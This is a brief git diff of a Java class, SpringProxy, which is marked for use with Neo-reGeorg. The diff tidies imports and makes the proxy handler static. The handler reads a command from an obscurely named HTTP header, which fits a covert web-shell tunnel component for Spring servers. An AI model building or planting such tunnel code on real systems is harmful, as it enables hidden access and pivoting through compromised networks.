@@ -1,6 +1,9 @@
 package com.stdout.Models;
 
-import com.stdout.Utils.*;
+import com.stdout.Utils.Redefine.MyRequest;
+import com.stdout.Utils.Redefine.MyResponse;
+import com.stdout.Utils.Redefine.MyServletInputStream;
+import com.stdout.Utils.Redefine.MySession;
 
 import java.net.InetSocketAddress;
 import java.nio.ByteBuffer;
@@ -10,8 +13,8 @@ import static com.stdout.Utils.B64.b64de;
 import static com.stdout.Utils.B64.b64en;
 
 public class SpringProxy {
-
-    public void doProxy(Object request, Object response) throws Exception {
+    // usage for Neo-reGeorg
+    public static void doProxy(Object request, Object response) throws Exception {
         MyResponse.resetBuffer(response);
         MyResponse.setStatus(response, 200);
         String cmd = MyRequest.getHeader(request, "Clgpbxohhlnb");
